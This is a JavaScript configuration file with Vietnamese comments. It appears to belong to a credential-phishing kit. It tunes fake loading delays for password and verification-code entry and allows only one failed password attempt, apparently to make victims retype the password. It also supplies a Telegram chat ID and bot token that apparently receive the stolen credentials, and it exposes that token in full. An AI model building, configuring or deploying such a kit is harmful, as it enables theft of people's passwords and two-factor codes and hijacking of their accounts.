const config = {
	settings: {
		// Thời gian Loading khi nhập code(milisecond)
		code_loading_time: 5000,
		// Số lượt nhập code tối đa
		max_failed_code_attempts: 3,
		// Số lượt nhập mật khẩu tối đa
		max_failed_password_attempts: 1,
		// Cái này không có tác dụng
		page_loading_time: 5000,
		// Thời gian loading khi nhập mật khẩu(milisecond)
		password_loading_time: 300,
		// Bật tắt nhập code
		code_input_enabled: true,
	},
	telegram: {
		chatid: '-1002660938824 ',
		token: '7752749140:AAH0MaXM2YqymQFzdw1vCm_pqE-65iR73cQ',
	},
};

export default config;
